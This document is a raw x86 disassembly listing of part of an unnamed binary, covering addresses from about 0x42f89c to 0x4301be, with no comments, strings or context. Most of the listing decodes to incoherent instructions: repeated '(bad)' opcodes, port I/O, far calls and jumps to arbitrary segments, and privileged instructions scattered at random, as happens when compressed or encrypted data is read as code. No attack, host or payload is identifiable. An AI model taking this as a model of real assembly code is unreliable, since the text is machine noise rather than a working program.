  42f89c:	into   
  42f89d:	test   BYTE PTR [esi],dl
  42f89f:	or     esp,edx
  42f8a1:	jne    0x42f918
  42f8a3:	in     al,dx
  42f8a4:	inc    esi
  42f8a5:	mov    bl,0xbb
  42f8a7:	cmp    ecx,DWORD PTR [eax-0x69f496c8]
  42f8ad:	cmp    bl,BYTE PTR [eax]
  42f8af:	adc    esi,esp
  42f8b1:	cmp    al,0xb3
  42f8b3:	cs jo  0x42f8f4
  42f8b6:	sub    BYTE PTR [ebx-0x245d6714],cl
  42f8bc:	cdq    
  42f8bd:	push   edx
  42f8be:	dec    ecx
  42f8bf:	mov    ebx,0xfd036427
  42f8c4:	outs   dx,BYTE PTR ds:[esi]
  42f8c5:	jp     0x42f877
  42f8c7:	scas   eax,DWORD PTR es:[edi]
  42f8c8:	out    dx,eax
  42f8c9:	dec    edx
  42f8ca:	outs   dx,DWORD PTR ds:[esi]
  42f8cb:	test   al,0x37
  42f8cd:	mov    ds:0x9b93b49c,eax
  42f8d2:	out    0x95,al
  42f8d4:	nop
  42f8d5:	jmp    ecx
  42f8d7:	cli    
  42f8d8:	jae    0x42f8cc
  42f8da:	dec    edx
  42f8db:	ret    0xe436
  42f8de:	pop    ebp
  42f8df:	(bad)  
  42f8e0:	ficom  WORD PTR [edi]
  42f8e2:	jl     0x42f893
  42f8e4:	adc    bl,BYTE PTR [edx-0x1050749c]
  42f8ea:	xchg   DWORD PTR [edx-0x29987178],ebx
  42f8f0:	call   ebx
  42f8f2:	test   eax,0x3f91b862
  42f8f7:	mov    ecx,0xb6515d68
  42f8fc:	or     DWORD PTR [ebx+0x8972e93],ecx
  42f902:	adc    bh,BYTE PTR [eax]
  42f904:	loope  0x42f962
  42f906:	sbb    esi,DWORD PTR [esi-0x71d13734]
  42f90c:	cli    
  42f90d:	leave  
  42f90e:	jo     0x42f98b
  42f910:	iret   
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f90a
  42f981:	scas   al,BYTE PTR es:[edi]
  42f982:	adc    eax,0x1fe9fa5
  42f987:	add    BYTE PTR ds:0x95000001,al
  42f98d:	mov    bl,0x5c
  42f98f:	sbb    DWORD PTR [esi-0x5e1a91b6],eax
  42f995:	call   0x82d3:0x8809136
  42f99c:	push   ss
  42f99d:	pop    es
  42f99e:	stos   BYTE PTR es:[edi],al
  42f99f:	push   ebx
  42f9a0:	ja     0x42f9f0
  42f9a2:	xchg   DWORD PTR [eax],esp
  42f9a4:	mov    bl,0x93
  42f9a6:	cwde   
  42f9a7:	mov    dl,0x7
  42f9a9:	mov    bh,BYTE PTR [esi]
  42f9ab:	aad    0xb4
  42f9ad:	fnstsw WORD PTR [ecx+0x6feefb91]
  42f9b3:	pop    ds
  42f9b4:	push   esp
  42f9b5:	or     cl,BYTE PTR [ebx]
  42f9b7:	mov    ch,0x88
  42f9b9:	mov    cl,0xd2
  42f9bb:	jmp    0x9e9ed295
  42f9c0:	xor    esi,0xffffff81
  42f9c3:	je     0x42f96c
  42f9c5:	cmp    al,bl
  42f9c7:	int    0xc0
  42f9c9:	test   eax,0x4e228ba7
  42f9ce:	dec    esi
  42f9cf:	jp     0x42fa12
  42f9d1:	test   DWORD PTR [eax+0x40],eax
  42f9d4:	lds    edx,FWORD PTR [ecx]
  42f9d6:	sbb    al,0x53
  42f9d8:	cmp    ah,ch
  42f9da:	shr    ecx,1
  42f9dc:	cwde   
  42f9dd:	lock sti 
  42f9df:	cdq    
  42f9e0:	mov    ebp,0x535dd52f
  42f9e5:	repz inc edi
  42f9e7:	inc    DWORD PTR [ecx]
  42f9e9:	scas   al,BYTE PTR es:[edi]
  42f9ea:	push   ds
  42f9eb:	inc    esi
  42f9ec:	popa   
  42f9ed:	lea    esi,cs:[esi]
  42f9f0:	mov    BYTE PTR [eax+0x25],bh
  42f9f3:	xlat   BYTE PTR ds:[ebx]
  42f9f4:	jns    0x42f9de
  42f9f6:	add    BYTE PTR [edi],0xcb
  42f9f9:	jnp    0x42fa3f
  42f9fb:	or     BYTE PTR [edx*4-0x42067587],dh
  42fa02:	mov    BYTE PTR [ebp+0x318ab834],ah
  42fa08:	jecxz  0x42f9a4
  42fa0a:	push   ss
  42fa0b:	pop    esi
  42fa0c:	lock sbb al,0xc4
  42fa0f:	jno    0x42fa52
  42fa11:	add    BYTE PTR [esi+0x19],cl
  42fa14:	loope  0x42f9ef
  42fa16:	arpl   WORD PTR [edx+0x27fd635f],sp
  42fa1c:	and    eax,eax
  42fa1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa1f:	pop    es
  42fa20:	lds    edi,FWORD PTR [edx]
  42fa22:	inc    DWORD PTR [eax-0x1bab9992]
  42fa28:	xchg   ecx,eax
  42fa29:	cs fsubr st(2),st
  42fa2c:	jmp    0x42fa02
  42fa2e:	push   ecx
  42fa2f:	inc    esi
  42fa30:	or     esp,edi
  42fa32:	pop    edx
  42fa33:	push   es
  42fa34:	sbb    eax,0x36aa03ed
  42fa39:	clc    
  42fa3a:	xchg   ecx,eax
  42fa3b:	fwait
  42fa3c:	xchg   ebp,eax
  42fa3d:	pop    ebp
  42fa3e:	outs   dx,BYTE PTR ds:[esi]
  42fa3f:	data16 or BYTE PTR [eax-0x6],0x79
  42fa44:	and    cl,ch
  42fa46:	mov    al,0x7
  42fa48:	arpl   WORD PTR [edx],cx
  42fa4a:	sbb    al,0x22
  42fa4c:	std    
  42fa4d:	mov    eax,eax
  42fa4f:	ret    0xf81d
  42fa52:	pop    es
  42fa53:	js     0x42fa0a
  42fa55:	dec    eax
  42fa56:	call   FWORD PTR [ecx+0x6f]
  42fa59:	push   0x6d
  42fa5b:	fcom   QWORD PTR [ebp-0x12]
  42fa5e:	aas    
  42fa5f:	cdq    
  42fa60:	pop    ebx
  42fa61:	mov    ds:0x58b17ae1,eax
  42fa66:	pop    edx
  42fa67:	pop    ss
  42fa68:	push   cs
  42fa69:	lds    ebx,FWORD PTR [ebx+0x3fd8242]
  42fa6f:	call   0xb463e9d1
  42fa74:	inc    edi
  42fa75:	lock mov edi,0x8e9eef2f
  42fa7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa7c:	jg     0x42fa7c
  42fa7e:	out    dx,al
  42fa7f:	pop    es
  42fa80:	sbb    DWORD PTR [edi+0xa6208a8],ebp
  42fa86:	inc    ecx
  42fa87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa88:	ins    DWORD PTR es:[edi],dx
  42fa89:	gs jo  0x42fa4d
  42fa8c:	xchg   edi,eax
  42fa8d:	imul   edx,DWORD PTR [eax],0x4a
  42fa90:	scas   al,BYTE PTR es:[edi]
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	push   cs
  42fb01:	mov    ecx,0xffa47ab9
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    eax,0x7f000001
  42fb0d:	xchg   ecx,eax
  42fb0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb0f:	ficom  DWORD PTR [edi+0x21]
  42fb12:	inc    cl
  42fb14:	outs   dx,BYTE PTR ds:[esi]
  42fb15:	ret    0xc7d6
  42fb18:	shl    DWORD PTR [edi-0x5bc6e8c],cl
  42fb1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb1f:	jbe    0x42fab1
  42fb21:	pop    es
  42fb22:	xchg   edx,eax
  42fb23:	jmp    0x442e9f16
  42fb28:	ret    0x154b
  42fb2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb2c:	xchg   DWORD PTR [edi-0x6e8802d0],esi
  42fb32:	mov    eax,0x8faca434
  42fb37:	add    al,0xc3
  42fb39:	es pushf 
  42fb3b:	inc    esi
  42fb3c:	sub    esp,DWORD PTR [ecx+0x76970afb]
  42fb42:	mov    DWORD PTR [edi+esi*1],0x4338dd25
  42fb49:	call   0xb1f:0x7f37f3e5
  42fb50:	fpatan 
  42fb52:	aad    0x9d
  42fb54:	xchg   BYTE PTR [ecx+edx*8],dl
  42fb57:	push   ebx
  42fb58:	lods   al,BYTE PTR ds:[esi]
  42fb59:	lea    ecx,[ebp+0x1b]
  42fb5c:	daa    
  42fb5d:	(bad)  
  42fb5e:	into   
  42fb5f:	mov    dl,0x5b
  42fb61:	int    0x3f
  42fb63:	stos   DWORD PTR es:[edi],eax
  42fb64:	add    BYTE PTR [esp+edi*4-0x35e533b0],ch
  42fb6b:	adc    DWORD PTR [edi+0x6c],ecx
  42fb6e:	add    cl,BYTE PTR [eax]
  42fb70:	arpl   di,cx
  42fb72:	ret    
  42fb73:	addr16 add cl,al
  42fb76:	cmp    al,0x51
  42fb78:	fstp   TBYTE PTR [eax-0x285fcc9e]
  42fb7e:	inc    esi
  42fb7f:	and    esp,ecx
  42fb81:	lfs    ebx,FWORD PTR [ebx+ebx*2-0x4a2baad8]
  42fb89:	lea    ecx,[esi-0x28450782]
  42fb8f:	iret   
  42fb90:	fwait
  42fb91:	sti    
  42fb92:	out    dx,al
  42fb93:	pop    eax
  42fb94:	nop
  42fb95:	lods   al,BYTE PTR ds:[esi]
  42fb96:	xlat   BYTE PTR ds:[ebx]
  42fb97:	pop    esp
  42fb98:	cmp    BYTE PTR [eax+0x5f],dl
  42fb9b:	cwde   
  42fb9c:	adc    BYTE PTR [edx-0x1dc82c50],al
  42fba2:	push   esi
  42fba3:	imul   ch
  42fba5:	lea    esp,[ebx]
  42fba7:	sbb    al,0x8a
  42fba9:	push   esp
  42fbaa:	idiv   ah
  42fbac:	xchg   ebx,eax
  42fbad:	test   DWORD PTR [ecx+0x19],ecx
  42fbb0:	cmp    DWORD PTR [bp+di-0x60b7],esp
  42fbb5:	pushf  
  42fbb6:	mov    ch,0x82
  42fbb8:	cmc    
  42fbb9:	loopne 0x42fb44
  42fbbb:	adc    DWORD PTR [edi],0x752f3d8
  42fbc1:	inc    edi
  42fbc2:	rcr    bl,1
  42fbc4:	and    ah,cl
  42fbc6:	test   DWORD PTR [ecx-0x71],ebp
  42fbc9:	sbb    al,BYTE PTR cs:[edi]
  42fbcc:	imul   ecx,ecx,0xffffff94
  42fbcf:	(bad)  
  42fbd1:	or     dh,BYTE PTR [ebp+0x3b612e5b]
  42fbd7:	mov    WORD PTR [ecx+0x1aed12bd],?
  42fbdd:	mov    bl,0x4b
  42fbdf:	dec    eax
  42fbe0:	lock aaa 
  42fbe2:	mov    edi,0x76394818
  42fbe7:	repz push esp
  42fbe9:	xor    BYTE PTR [ebx],cl
  42fbeb:	xchg   esp,eax
  42fbec:	imul   ebx,DWORD PTR [ebx-0x43],0xffffff80
  42fbf0:	xchg   ch,ch
  42fbf2:	adc    bl,BYTE PTR [ecx]
  42fbf4:	shr    DWORD PTR [ebp-0x32445cfa],0x7b
  42fbfb:	fcom   QWORD PTR [esp+ebx*8]
  42fbfe:	sub    al,0x3f
  42fc00:	sahf   
  42fc01:	dec    edx
  42fc02:	loope  0x42fbc1
  42fc04:	dec    DWORD PTR [eax]
  42fc06:	jns    0x42fb92
  42fc08:	popa   
  42fc09:	pop    es
  42fc0a:	inc    edx
  42fc0b:	jnp    0x42fbda
  42fc0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc0e:	pop    ds
  42fc0f:	rcr    DWORD PTR [edx],1
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0xb9db:0x2036325e
  42fc82:	or     eax,0x200a96f
  42fc87:	add    BYTE PTR ds:0x27000001,al
  42fc8d:	add    edi,ecx
  42fc8f:	ror    ebx,1
  42fc91:	mov    esp,DWORD PTR [eax]
  42fc93:	inc    ebx
  42fc94:	inc    ecx
  42fc95:	ja     0x42fcbb
  42fc97:	xchg   edx,eax
  42fc98:	call   0x18e5:0x6b6a1c15
  42fc9f:	retf   0x19b2
  42fca2:	outs   dx,DWORD PTR ds:[esi]
  42fca3:	adc    BYTE PTR [ebp+0x420114a7],0x23
  42fcaa:	iret   
  42fcab:	push   esp
  42fcac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fcad:	test   DWORD PTR [edx-0x54],ebx
  42fcb0:	fcom   QWORD PTR [ecx+0x61]
  42fcb3:	add    eax,0xaa20dc45
  42fcb8:	mov    edi,0xf010e7e6
  42fcbd:	and    esi,ecx
  42fcbf:	mov    al,0xbb
  42fcc1:	rcl    DWORD PTR [ebp-0x35],1
  42fcc4:	ret    0xd029
  42fcc7:	loope  0x42fce7
  42fcc9:	ror    DWORD PTR ds:0xbe60f6c6,cl
  42fccf:	in     al,0xab
  42fcd1:	xor    al,0xb8
  42fcd3:	mov    edx,0xc606d89d
  42fcd8:	aam    0xe9
  42fcda:	jno    0x42fc94
  42fcdc:	cmp    cl,al
  42fcde:	scas   eax,DWORD PTR es:[edi]
  42fcdf:	ss dec edi
  42fce1:	jmp    0x1807:0x42cf6da9
  42fce8:	popa   
  42fce9:	xchg   BYTE PTR [ebp+0x39],bl
  42fcec:	pushf  
  42fced:	dec    ebx
  42fcee:	mov    dl,0x8f
  42fcf0:	nop
  42fcf1:	vpaddusb ymm6,ymm6,YMMWORD PTR [esi+0x2c0a7c1e]
  42fcf9:	inc    ebp
  42fcfa:	imul   esp,DWORD PTR [esi+0x59],0x2dbe1665
  42fd01:	sbb    dh,dh
  42fd03:	bound  ecx,QWORD PTR [edi+0x70]
  42fd06:	pop    es
  42fd07:	sahf   
  42fd08:	sar    DWORD PTR [ecx],0xf5
  42fd0b:	cld    
  42fd0c:	xor    ah,BYTE PTR [ecx*8-0x4076b3b8]
  42fd13:	or     eax,0x3b4aa42
  42fd18:	das    
  42fd19:	ja     0x42fc9b
  42fd1b:	pushf  
  42fd1c:	xor    bh,BYTE PTR [ecx-0x1a]
  42fd1f:	jl     0x42fd87
  42fd21:	out    0xff,al
  42fd23:	jecxz  0x42fcbc
  42fd25:	jmp    0x8467:0x9030095f
  42fd2c:	pop    ss
  42fd2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd2e:	lea    eax,[edx+edx*2+0x59c9cf16]
  42fd35:	sahf   
  42fd36:	rol    DWORD PTR [eax-0x68],1
  42fd39:	cmp    BYTE PTR [ebp+0x4338d0c9],al
  42fd3f:	stos   DWORD PTR es:[edi],eax
  42fd40:	mov    dh,0xa0
  42fd42:	fwait
  42fd43:	push   ebx
  42fd44:	jae    0x42fd04
  42fd46:	inc    esp
  42fd47:	cmp    bh,0xca
  42fd4a:	stc    
  42fd4b:	xchg   ebp,eax
  42fd4c:	jne    0x42fd12
  42fd4e:	xchg   edi,eax
  42fd4f:	sahf   
  42fd50:	cmp    dl,BYTE PTR [esi+0x5f03e8cc]
  42fd56:	jp     0x42fda0
  42fd58:	add    ecx,ebp
  42fd5a:	loope  0x42fdd0
  42fd5c:	loope  0x42fcf4
  42fd5e:	(bad)  
  42fd60:	or     esi,eax
  42fd62:	pop    eax
  42fd63:	mov    bh,ah
  42fd65:	xor    bl,BYTE PTR [eax]
  42fd67:	test   BYTE PTR [ebp+eiz*2+0x1e],cl
  42fd6b:	push   ss
  42fd6c:	rcl    BYTE PTR [eax],0xa5
  42fd6f:	xchg   edx,eax
  42fd70:	pop    DWORD PTR [edi-0x44]
  42fd73:	pop    esi
  42fd74:	add    ch,BYTE PTR [eax+0x1c]
  42fd77:	push   cs
  42fd78:	mov    esp,0xe8fa0180
  42fd7d:	and    eax,edx
  42fd7f:	push   ds
  42fd80:	daa    
  42fd81:	inc    ebx
  42fd82:	(bad)  
  42fd83:	div    esp
  42fd85:	jp     0x42fd80
  42fd87:	retf   0x4095
  42fd8a:	in     al,dx
  42fd8b:	loope  0x42fd8f
  42fd8d:	add    edx,esi
  42fd8f:	sbb    edx,DWORD PTR [ebx+0x0]
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	xrelease xchg DWORD PTR [ecx],esi
  42fe02:	ins    BYTE PTR es:[edi],dx
  42fe03:	adc    DWORD PTR [esi+0x5000201],ebp
  42fe09:	add    DWORD PTR [eax],eax
  42fe0b:	add    BYTE PTR [edx+esi*1-0x33],ch
  42fe0f:	cmp    DWORD PTR [eax],0x72
  42fe12:	inc    sp
  42fe14:	inc    ecx
  42fe15:	imul   ecx,esp,0xffffffa2
  42fe18:	push   edi
  42fe19:	stc    
  42fe1a:	mov    ah,0x88
  42fe1c:	adc    eax,0x67b9a52f
  42fe21:	fwait
  42fe22:	gs cdq 
  42fe24:	jo     0x42fe5e
  42fe26:	inc    esi
  42fe27:	mov    ebp,0x792c1f94
  42fe2c:	fdivr  QWORD PTR [ebp+0x5f]
  42fe2f:	ins    BYTE PTR es:[edi],dx
  42fe30:	imul   edx,DWORD PTR [esi],0x14159398
  42fe36:	nop
  42fe37:	in     eax,dx
  42fe38:	cmp    BYTE PTR [ecx+0x11],al
  42fe3b:	mov    eax,0x826e43a3
  42fe40:	cmp    ebp,DWORD PTR [eax-0x1d]
  42fe43:	xlat   BYTE PTR ds:[ebx]
  42fe44:	adc    ah,BYTE PTR [ebp-0x3a05579d]
  42fe4a:	jmp    0xe5ba2f38
  42fe4f:	(bad)  [edi]
  42fe51:	retf   
  42fe52:	inc    ebp
  42fe53:	sub    BYTE PTR [ebx],dl
  42fe55:	aas    
  42fe56:	or     BYTE PTR [ebx-0x55],0xc0
  42fe5a:	or     ebp,DWORD PTR [edi+ecx*2]
  42fe5d:	ds jg  0x42fe11
  42fe60:	inc    ebp
  42fe61:	dec    ebp
  42fe62:	out    0x2b,al
  42fe64:	xchg   ebx,edx
  42fe66:	fdivr  st(3),st
  42fe68:	sti    
  42fe69:	xor    BYTE PTR [eax-0x460c6413],bl
  42fe6f:	mov    WORD PTR [esi],?
  42fe71:	pop    esi
  42fe72:	push   edx
  42fe73:	icebp  
  42fe74:	and    cl,cl
  42fe76:	push   edi
  42fe77:	fldcw  WORD PTR [eax-0x48]
  42fe7a:	es add bh,bl
  42fe7d:	xchg   esi,eax
  42fe7e:	mov    ds:0x2395ea1b,eax
  42fe83:	push   edi
  42fe84:	sub    BYTE PTR [ebx+0x11],bh
  42fe87:	scas   al,BYTE PTR es:[edi]
  42fe88:	cmp    BYTE PTR [esp+esi*4],ch
  42fe8b:	rol    bh,cl
  42fe8d:	xchg   BYTE PTR [edx+0x5f],bl
  42fe90:	xor    eax,0x8b1f503f
  42fe95:	(bad)  
  42fe96:	xlat   BYTE PTR ds:[ebx]
  42fe97:	outs   dx,BYTE PTR ds:[esi]
  42fe98:	stos   DWORD PTR es:[edi],eax
  42fe99:	mov    DWORD PTR [ebx],esp
  42fe9b:	(bad)
  42fe9f:	xchg   ebp,eax
  42fea0:	jmp    0x64a5:0x14b8fa25
  42fea7:	call   0x2cfc67a
  42feac:	aad    0x84
  42feae:	mov    al,ds:0xf0a41b96
  42feb3:	and    al,0x63
  42feb5:	or     dh,BYTE PTR [eax-0x70e05a6d]
  42febb:	ret    0xc3e5
  42febe:	jp     0x42feea
  42fec0:	lods   eax,DWORD PTR ds:[esi]
  42fec1:	imul   ecx,esi,0xffffff8d
  42fec4:	nop
  42fec5:	push   esi
  42fec6:	sub    al,0x48
  42fec8:	jmp    0xc556f84e
  42fecd:	mov    ah,BYTE PTR [ebx]
  42fecf:	popa   
  42fed0:	and    ebp,DWORD PTR [edx]
  42fed2:	aas    
  42fed3:	jns    0x42fef4
  42fed5:	(bad)  
  42fed6:	and    al,0x89
  42fed8:	dec    ebx
  42fed9:	mov    dh,0xc1
  42fedb:	lock pop ebp
  42fedd:	fiadd  DWORD PTR [edi+0x4a]
  42fee0:	es mov ah,0xfc
  42fee3:	cmp    BYTE PTR [eax],ch
  42fee5:	movzx  ebp,cl
  42fee8:	lods   eax,DWORD PTR ds:[esi]
  42fee9:	jg     0x42ff09
  42feeb:	fadd   DWORD PTR [ebx+eax*1]
  42feee:	adc    BYTE PTR [edx+ebx*8+0x61f9eed],dh
  42fef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fef6:	lea    esp,[eax+0x44]
  42fef9:	or     DWORD PTR [edi+0x5314504e],esi
  42feff:	mov    ch,0x68
  42ff01:	or     DWORD PTR [ebp+0x6a780423],edx
  42ff07:	je     0x42feda
  42ff09:	in     eax,0x4e
  42ff0b:	add    al,0xc8
  42ff0d:	in     eax,dx
  42ff0e:	movhps QWORD PTR [edi+0x0],xmm3
	...
  42ff72:	add    BYTE PTR [eax],al
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [edx+edx*8+0x6c],0x8f
  42ff83:	loop   0x42ff38
  42ff85:	add    al,BYTE PTR [edx]
  42ff87:	add    cl,cl
  42ff89:	add    BYTE PTR [eax],al
  42ff8b:	add    ah,dl
  42ff8d:	cmp    edi,DWORD PTR [esi-0x214c7551]
  42ff93:	out    dx,al
  42ff94:	in     eax,dx
  42ff95:	adc    ecx,DWORD PTR [edx+0x42]
  42ff98:	xchg   esp,eax
  42ff99:	and    DWORD PTR [esi+0xc],esi
  42ff9c:	sar    DWORD PTR [eax+eiz*2],1
  42ff9f:	retf   
  42ffa0:	xlat   BYTE PTR ds:[ebx]
  42ffa1:	jo     0x42ff77
  42ffa3:	das    
  42ffa4:	dec    ebx
  42ffa5:	jne    0x42ff46
  42ffa7:	and    esp,eax
  42ffa9:	mov    ebp,0x995b086
  42ffae:	out    dx,eax
  42ffaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffb0:	pop    eax
  42ffb1:	push   esp
  42ffb2:	stos   DWORD PTR es:[edi],eax
  42ffb3:	sub    edx,esp
  42ffb5:	dec    esp
  42ffb6:	jmp    0x48005a7b
  42ffbb:	jp     0x42ffea
  42ffbd:	sbb    eax,0x1b6315ce
  42ffc2:	sar    DWORD PTR [eax+0x2e],0xfe
  42ffc6:	jno    0x430037
  42ffc8:	lods   al,BYTE PTR ds:[esi]
  42ffc9:	pop    ecx
  42ffca:	fld    QWORD PTR fs:[ebx+ebp*8+0x425e6893]
  42ffd2:	fwait
  42ffd3:	push   edx
  42ffd4:	popf   
  42ffd5:	lods   eax,DWORD PTR ds:[esi]
  42ffd6:	sbb    al,0x98
  42ffd8:	sbb    DWORD PTR [esi],edi
  42ffda:	jp     0x42ffea
  42ffdc:	sub    DWORD PTR [edi],esi
  42ffde:	scas   eax,DWORD PTR es:[edi]
  42ffdf:	and    DWORD PTR [ebp-0x10],ebx
  42ffe2:	xor    esp,DWORD PTR [eax+0x74]
  42ffe5:	add    esi,DWORD PTR [ebx]
  42ffe7:	into   
  42ffe8:	jae    0x42ffd0
  42ffea:	ds dec esp
  42ffec:	aaa    
  42ffed:	sbb    al,0x76
  42ffef:	js     0x42ffd8
  42fff1:	inc    esp
  42fff2:	retf   
  42fff3:	repnz fcomi st,st(2)
  42fff6:	xor    eax,0xb4639f4c
  42fffb:	or     al,0x2b
  42fffd:	test   BYTE PTR [eax-0x6d51026f],ch
  430003:	or     BYTE PTR [esi],al
  430005:	retf   0xa082
  430008:	in     al,0xd2
  43000a:	xchg   BYTE PTR [edi+0x12360267],ch
  430010:	sub    al,0x62
  430012:	adc    eax,0x914552a3
  430017:	fst    st(5)
  430019:	push   ds
  43001a:	adc    ecx,DWORD PTR [eax+0x353e7359]
  430020:	xor    ah,bl
  430022:	inc    ebp
  430023:	rcl    DWORD PTR [edi-0x663c1096],1
  430029:	test   eax,ebp
  43002b:	test   DWORD PTR [eax+0x166d8f07],esi
  430031:	xchg   DWORD PTR [esi-0x52fd587e],ebp
  430037:	adc    DWORD PTR [esi],ebx
  430039:	and    bh,dh
  43003b:	std    
  43003c:	jns    0x43004d
  43003e:	inc    esp
  43003f:	add    DWORD PTR [ecx+0x181426bf],edi
  430045:	sahf   
  430046:	xor    DWORD PTR [esi],ecx
  430048:	jecxz  0x430080
  43004a:	jg     0x430057
  43004c:	mov    BYTE PTR [ecx-0x61f673f3],al
  430052:	test   BYTE PTR [edx+0x1b],dl
	...
  430074:	dec    ebp
  430075:	push   ebp
  430076:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43007c:	mov    esp,ebp
  43007e:	or     ah,dh
  430080:	dec    ebp
  430081:	add    bh,al
  430083:	add    BYTE PTR [eax],cl
  430085:	add    BYTE PTR [eax],al
  430087:	mov    DWORD PTR [eax],0x40f44545
  43008d:	xor    DWORD PTR [eax],eax
  43008f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430095:	(bad)  
  430096:	enter  0x4d45,0xbc
  43009a:	mov    esi,DWORD PTR [edx]
  43009c:	hlt    
  43009d:	test   ebx,ecx
  43009f:	pushf  
  4300a0:	enter  0x4df8,0x8b
  4300a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4300ab:	inc    ebp
  4300ac:	mov    ebp,0xff8bfffc
  4300b1:	dec    ebp
  4300b2:	mov    ch,0xf4
  4300b4:	call   DWORD PTR [ebx-0x1]
  4300b7:	mov    ebx,0x8005474
  4300bc:	call   DWORD PTR [ecx+0x8]
  4300bf:	pop    es
  4300c0:	jmp    0xb8:0xacb4533
  4300c7:	fwait
  4300c8:	mov    esi,DWORD PTR [edx-0xc]
  4300cb:	xor    cl,bl
  4300cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4300d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4300d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4300df:	xor    eax,DWORD PTR [eax]
  4300e1:	retf   
  4300e2:	retf   
  4300e3:	add    ecx,eax
  4300e5:	enter  0x894d,0x64
  4300e9:	dec    ebp
  4300ea:	sbb    ah,cl
  4300ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4300f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4300f8:	test   DWORD PTR [ebx],esi
  4300fa:	dec    ebx
  4300fc:	inc    DWORD PTR [ebx]
  4300fe:	inc    eax
  4300ff:	enter  0x8989,0x50
  430103:	(bad)  
  430104:	call   DWORD PTR [ebx+ecx*4-0x1]
  430108:	cld    
  430109:	dec    DWORD PTR [ebp-0xa90001]
  43010f:	push   edi
  430110:	mov    BYTE PTR [edx+0x1],ch
  430113:	and    al,BYTE PTR [eax]
  430115:	pop    ecx
  430116:	inc    ebp
  430117:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43011d:	push   0xffffff89
  43011f:	pop    ecx
  430120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430121:	dec    ebp
  430122:	add    BYTE PTR [ecx+0x45fc088b],cl
  430128:	jne    0x430174
  43012a:	lea    eax,[eax]
  43012c:	push   eax
  43012d:	(bad)  
  43012e:	dec    DWORD PTR [eax]
  430130:	mov    DWORD PTR [eax],eax
  430132:	test   al,0x0
  430134:	add    BYTE PTR [ebp-0x18],cl
  430137:	xor    ebp,DWORD PTR [ebx]
  430139:	add    eax,DWORD PTR [eax]
  43013b:	mov    eax,eax
  43013d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430144:	inc    ebp
  430145:	mov    DWORD PTR [ebx+0x459408],ecx
  43014b:	arpl   WORD PTR [ebx-0x372749b],cx
  430151:	sub    al,0x80
  430153:	inc    DWORD PTR [ecx]
  430155:	lea    eax,[eax]
  430157:	or     al,0x0
  430159:	inc    DWORD PTR [ecx-0x18]
  43015c:	mov    ecx,DWORD PTR [ebx]
  43015e:	cld    
  43015f:	add    BYTE PTR [ecx+0x75014d],cl
  430165:	(bad)  
  430166:	xchg   ebp,eax
  430167:	fdivr  st,st(7)
  430169:	inc    eax
  43016a:	inc    DWORD PTR [eax]
  43016c:	mov    ecx,DWORD PTR [ebp-0x4]
  43016f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430175:	add    BYTE PTR [edx],dl
  430177:	enter  0x4d90,0x0
  43017b:	mov    eax,DWORD PTR [eax]
  43017d:	hlt    
  43017e:	add    al,0xa5
  430180:	mov    al,0xff
  430182:	add    bh,bh
  430184:	add    BYTE PTR [ebx],dh
  430186:	inc    DWORD PTR [ebx]
  430188:	sbb    al,0x89
  43018a:	jne    0x430168
  43018c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430192:	mov    eax,DWORD PTR [ebp-0xff0048]
  430198:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43019f:	inc    DWORD PTR [ebp-0x75]
  4301a2:	fisttp QWORD PTR [esi+ebp*8]
  4301a5:	test   DWORD PTR [esi-0x1],esp
  4301a8:	inc    ebp
  4301a9:	(bad)  
  4301aa:	aas    
  4301ab:	inc    ebp
  4301ac:	(bad)  
  4301ad:	lea    edi,[esp+eiz*2-0x1]
  4301b1:	inc    edi
  4301b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4301b9:	mov    ebp,esp
  4301bb:	cld    
  4301bc:	loop   0x43014b
  4301be:	inc    ebp
